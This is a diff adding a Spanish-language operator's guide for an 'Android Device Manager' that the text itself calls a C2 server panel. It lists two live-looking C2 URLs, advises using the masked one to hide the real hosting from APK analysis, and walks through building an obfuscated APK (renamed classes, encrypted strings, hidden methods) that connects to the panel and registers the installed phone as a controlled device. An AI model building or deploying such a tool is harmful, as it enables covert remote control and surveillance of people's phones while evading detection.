@@ -1,0 +1,41 @@
+==================================================================
+GUÍA TÉCNICA - ANDROID DEVICE MANAGER (ADM)
+==================================================================
+
+1. LINK DEL PANEL WEB (C2 SERVER):
+----------------------------------
+- URL Recomendada (Enmascarada): https://repodeploy.vercel.app
+- URL Directa (Render): https://android-device-manager-one.onrender.com
+
+Nota: Se recomienda usar la URL Enmascarada de Vercel para ocultar
+la infraestructura real de Render ante posibles análisis del APK.
+
+2. CONFIGURACIONES DE ENMASCARAMIENTO Y SEGURIDAD:
+-------------------------------------------------
+En la pestaña "Advanced" del APK Builder, asegúrate de activar:
+- Code Obfuscation (Basic): Renombra clases para dificultar lectura.
+- Advanced Obfuscation (Pro): Encripta strings y oculta métodos.
+- SSL/TLS: Garantiza que la comunicación sea cifrada.
+
+3. PASO A PASO PARA CREAR EL APK Y CONECTARLO:
+----------------------------------------------
+Paso 1: Entra a tu panel en Vercel (repodeploy.vercel.app).
+Paso 2: Ve al módulo "APK Builder" en el menú lateral.
+Paso 3: (Opcional) Configura el nombre de la App y el icono.
+Paso 4: Entra a la pestaña "Advanced".
+Paso 5: Activa los interruptores de "Obfuscation" (Basic y Pro).
+Paso 6: En la sección "Network Configuration", busca la tabla de 
+        "Formatos de Conexión Disponibles".
+Paso 7: Haz clic en el botón de copiar de la opción 
+        "URL ENMASCARADA (RECOMENDADO PARA OCULTAR RENDER)".
+Paso 8: Automáticamente se pegará "https://repodeploy.vercel.app" 
+        en el cuadro de arriba (Server Connection).
+Paso 9: Haz clic en el botón verde "Build APK".
+Paso 10: Ve a la pestaña "Builds", espera a que diga "READY" y 
+         descarga el APK a tu dispositivo Android.
+Paso 11: Instala el APK, concede los permisos solicitados y
+         automáticamente aparecerá en tu lista de "Dispositivos".
+
+==================================================================
+PROTOCOLO SAPSAN - SISTEMA ACTIVO DE MONITOREO
+==================================================================
